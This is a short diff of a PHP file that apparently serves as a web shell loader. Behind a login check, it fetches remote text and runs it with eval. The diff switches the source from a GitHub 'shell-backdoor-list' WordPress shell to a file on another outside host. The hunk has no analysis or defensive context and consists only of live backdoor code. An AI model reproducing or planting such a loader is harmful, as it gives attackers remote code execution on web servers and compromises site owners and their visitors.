@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/refs/heads/master/shell/php/wordpress.php');
+    $a = geturlsinfo('https://marslogs.co.id/shell/shell/2018.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
